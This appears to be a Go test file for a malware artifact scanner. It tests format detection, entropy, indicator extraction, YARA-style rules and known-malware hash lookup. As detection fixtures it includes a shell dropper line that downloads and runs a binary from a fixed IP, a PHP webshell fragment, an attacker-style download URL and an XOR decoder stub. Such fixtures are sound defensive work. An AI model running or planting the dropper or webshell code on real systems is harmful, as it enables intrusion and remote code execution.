package artifactscan

import (
	"archive/zip"
	"bytes"
	"encoding/binary"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestBuiltinRulesCompile(t *testing.T) {
	e := NewEngine()
	if e.RuleCount() == 0 {
		t.Fatal("expected built-in rules to compile")
	}
}

func TestDetectFormat(t *testing.T) {
	cases := []struct {
		data []byte
		want string
	}{
		{[]byte("\x7fELF\x02\x01\x01"), "elf"},
		{append([]byte("MZ........"), []byte("PE\x00\x00")...), "pe"},
		{[]byte{0xfe, 0xed, 0xfa, 0xcf}, "macho"},
		{[]byte("PK\x03\x04rest"), "zip"},
		{[]byte("#!/bin/sh\n"), "script"},
		{[]byte("just some text"), "data"},
	}
	for _, c := range cases {
		if got, _ := detectFormat(c.data); got != c.want {
			t.Errorf("detectFormat(%q) = %q, want %q", c.data[:min(6, len(c.data))], got, c.want)
		}
	}
}

// minimalELF64 builds a 64-byte ELF64 header debug/elf can parse (no sections).
func minimalELF64() []byte {
	b := make([]byte, 64)
	copy(b, []byte{0x7f, 'E', 'L', 'F', 2, 1, 1, 0})
	binary.LittleEndian.PutUint16(b[16:], 2)  // e_type = ET_EXEC
	binary.LittleEndian.PutUint16(b[18:], 62) // e_machine = EM_X86_64
	binary.LittleEndian.PutUint32(b[20:], 1)  // e_version
	binary.LittleEndian.PutUint16(b[52:], 64) // e_ehsize
	return b
}

func TestAnalyzeELF(t *testing.T) {
	r := Analyze(minimalELF64())
	if r.Format != "elf" {
		t.Fatalf("format = %q, want elf", r.Format)
	}
	if !strings.Contains(r.Arch, "X86_64") {
		t.Errorf("arch = %q, want X86_64", r.Arch)
	}
	if r.SHA256 == "" || r.Size != 64 {
		t.Errorf("sha256/size wrong: %q %d", r.SHA256, r.Size)
	}
}

func TestAnalyzeZip(t *testing.T) {
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	for _, name := range []string{"META-INF/MANIFEST.MF", "Main.class"} {
		w, _ := zw.Create(name)
		_, _ = w.Write([]byte("data"))
	}
	zw.Close()
	r := Analyze(buf.Bytes())
	if r.Format != "zip" {
		t.Fatalf("format = %q, want zip", r.Format)
	}
	if !strings.Contains(r.FormatDetail, "JAR") {
		t.Errorf("detail = %q, want JAR", r.FormatDetail)
	}
}

func TestEntropy(t *testing.T) {
	if h := shannonEntropy(bytes.Repeat([]byte{0}, 1000)); h != 0 {
		t.Errorf("constant entropy = %v, want 0", h)
	}
	full := make([]byte, 256)
	for i := range full {
		full[i] = byte(i)
	}
	if h := shannonEntropy(full); h < 7.9 {
		t.Errorf("uniform entropy = %v, want ~8", h)
	}
}

func TestExtractStringsAndIOCs(t *testing.T) {
	data := []byte("GET http://evil.example/x.bin from 203.0.113.7 admin@evil.example\x00\x01padpad")
	strs := extractStrings(data, 4, 50)
	if len(strs) == 0 {
		t.Fatal("no strings extracted")
	}
	iocs := extractIOCs(strs, 16)
	if len(iocs.URLs) == 0 || !strings.Contains(iocs.URLs[0], "evil.example") {
		t.Errorf("urls = %v", iocs.URLs)
	}
	if len(iocs.IPv4) == 0 || iocs.IPv4[0] != "203.0.113.7" {
		t.Errorf("ipv4 = %v", iocs.IPv4)
	}
	if len(iocs.Emails) == 0 {
		t.Errorf("emails = %v", iocs.Emails)
	}
}

func TestIOCDomainFilterDropsFilenames(t *testing.T) {
	iocs := extractIOCs([]string{"loads kernel32.dll and ws2_32.dll", "c2.baddomain.net"}, 16)
	for _, d := range iocs.Domains {
		if strings.HasSuffix(d, ".dll") {
			t.Errorf("filename leaked into domains: %v", iocs.Domains)
		}
	}
	if !contains(iocs.Domains, "c2.baddomain.net") {
		t.Errorf("real domain missing: %v", iocs.Domains)
	}
}

func TestYaraBuiltinShellDropper(t *testing.T) {
	e := NewEngine()
	data := []byte("#!/bin/sh\nwget http://1.2.3.4/a -O /tmp/a; chmod +x /tmp/a; /tmp/a\n")
	matches := e.Scan(data)
	if !hasMatch(matches, "Shell_Dropper") {
		t.Errorf("expected Shell_Dropper, got %v", matchNames(matches))
	}
}

func TestYaraBuiltinUPX(t *testing.T) {
	e := NewEngine()
	data := []byte("....UPX0....UPX1....UPX!....")
	if !hasMatch(e.Scan(data), "PE_Packed_UPX") {
		t.Error("expected PE_Packed_UPX")
	}
}

func TestYaraBuiltinHexXorStub(t *testing.T) {
	e := NewEngine()
	// E8 00 00 00 00 (getpc) ... 31 C0 (xor eax,eax) ... E2 FB (loop)
	data := append([]byte{0xe8, 0, 0, 0, 0, 0x90, 0x31, 0xc0, 0x90, 0xe2, 0xfb}, bytes.Repeat([]byte{0x90}, 20)...)
	if !hasMatch(e.Scan(data), "XOR_Decoder_Stub") {
		t.Error("expected XOR_Decoder_Stub")
	}
}

func TestParseCustomRuleAndMatch(t *testing.T) {
	src := `rule MyRule : test {
		meta:
			author = "unit"
		strings:
			$a = "malware" nocase
			$b = { DE AD ?? EF }
		condition:
			$a and $b
	}`
	rules, errs := ParseRules(src)
	if len(errs) != 0 {
		t.Fatalf("parse errors: %v", errs)
	}
	if len(rules) != 1 || rules[0].Name != "MyRule" {
		t.Fatalf("rules = %+v", rules)
	}
	if rules[0].Meta["author"] != "unit" {
		t.Errorf("meta author = %q", rules[0].Meta["author"])
	}
	e := &Engine{rules: rules}
	hit := append([]byte("contains MALWARE here "), 0xDE, 0xAD, 0x12, 0xEF)
	if !hasMatch(e.Scan(hit), "MyRule") {
		t.Error("rule should match nocase string + hex wildcard")
	}
	miss := []byte("contains malware but no hex")
	if hasMatch(e.Scan(miss), "MyRule") {
		t.Error("rule should not match without hex pattern")
	}
}

func TestUnsupportedRuleSkipped(t *testing.T) {
	src := `rule Unsupported {
		condition:
			filesize > 1000 and uint16(0) == 0x5a4d
	}
	rule Good {
		strings:
			$a = "x"
		condition:
			$a
	}`
	rules, errs := ParseRules(src)
	if len(errs) == 0 {
		t.Error("expected an error for the unsupported rule")
	}
	if len(rules) != 1 || rules[0].Name != "Good" {
		t.Errorf("expected only Good to compile, got %v", ruleNames(rules))
	}
}

func TestConditionForms(t *testing.T) {
	mk := func(cond string) *Rule {
		src := "rule R {\nstrings:\n$a = \"a\"\n$b = \"b\"\n$c = \"c\"\ncondition:\n" + cond + "\n}"
		rules, errs := ParseRules(src)
		if len(errs) != 0 || len(rules) != 1 {
			t.Fatalf("cond %q parse errs %v", cond, errs)
		}
		return &rules[0]
	}
	tests := []struct {
		cond string
		data string
		want bool
	}{
		{"$a and $b", "ab", true},
		{"$a and $b", "a", false},
		{"$a or $c", "c", true},
		{"any of them", "b", true},
		{"all of them", "abc", true},
		{"all of them", "ab", false},
		{"2 of them", "ac", true},
		{"2 of them", "a", false},
		{"not $a", "b", true},
		{"any of ($a, $b)", "b", true},
		{"($a and $b) or $c", "c", true},
	}
	for _, tc := range tests {
		r := mk(tc.cond)
		_, ok := r.eval([]byte(tc.data), bytes.ToLower([]byte(tc.data)))
		if ok != tc.want {
			t.Errorf("cond %q data %q = %v, want %v", tc.cond, tc.data, ok, tc.want)
		}
	}
}

func TestAnalyzeWithEngine(t *testing.T) {
	e := NewEngine()
	data := []byte("eval(base64_decode($_POST['x']));")
	r := AnalyzeWith(data, e)
	if !hasMatch(r.YaraMatches, "Webshell_PHP") {
		t.Errorf("expected Webshell_PHP in report, got %v", matchNames(r.YaraMatches))
	}
}

func TestEngineLoadDir(t *testing.T) {
	dir := t.TempDir()
	rule := `rule Custom_Loaded : test {
		strings:
			$marker = "TOTALLY_CUSTOM_MARKER"
		condition:
			$marker
	}`
	if err := os.WriteFile(filepath.Join(dir, "custom.yar"), []byte(rule), 0o644); err != nil {
		t.Fatal(err)
	}
	// A non-rule file must be ignored.
	_ = os.WriteFile(filepath.Join(dir, "readme.txt"), []byte("not a rule"), 0o644)

	e := NewEngine()
	base := e.RuleCount()
	added, errs := e.LoadDir(dir)
	if len(errs) != 0 {
		t.Fatalf("load errors: %v", errs)
	}
	if added != 1 || e.RuleCount() != base+1 {
		t.Fatalf("added=%d total=%d (base %d)", added, e.RuleCount(), base)
	}
	if !hasMatch(e.Scan([]byte("has TOTALLY_CUSTOM_MARKER in it")), "Custom_Loaded") {
		t.Error("loaded rule did not match")
	}
}

func TestKnownMalwareHashLookup(t *testing.T) {
	data := []byte("malicious payload bytes here")
	rep := Analyze(data) // compute the real sha256 first
	dir := t.TempDir()
	// ThreatFox-style "sha256,family" plus a bare hash and a comment.
	body := "# abuse.ch export\n" + rep.SHA256 + ",AgentTesla,exe\n" +
		"deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef\n"
	if err := os.WriteFile(filepath.Join(dir, "hashes.txt"), []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
	e := NewEngine()
	n, err := e.LoadHashes(filepath.Join(dir, "hashes.txt"))
	if err != nil || n != 2 {
		t.Fatalf("LoadHashes n=%d err=%v", n, err)
	}
	got := AnalyzeWith(data, e)
	if !got.KnownMalware || got.Family != "AgentTesla" {
		t.Errorf("known-malware lookup failed: known=%v family=%q", got.KnownMalware, got.Family)
	}
	// A different artifact is not flagged.
	clean := AnalyzeWith([]byte("totally benign content"), e)
	if clean.KnownMalware {
		t.Error("benign artifact wrongly flagged as known malware")
	}
}

// --- helpers ---

func hasMatch(ms []Match, name string) bool {
	for _, m := range ms {
		if m.Rule == name {
			return true
		}
	}
	return false
}

func matchNames(ms []Match) []string {
	var n []string
	for _, m := range ms {
		n = append(n, m.Rule)
	}
	return n
}

func ruleNames(rs []Rule) []string {
	var n []string
	for _, r := range rs {
		n = append(n, r.Name)
	}
	return n
}

func contains(ss []string, s string) bool {
	for _, x := range ss {
		if x == s {
			return true
		}
	}
	return false
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
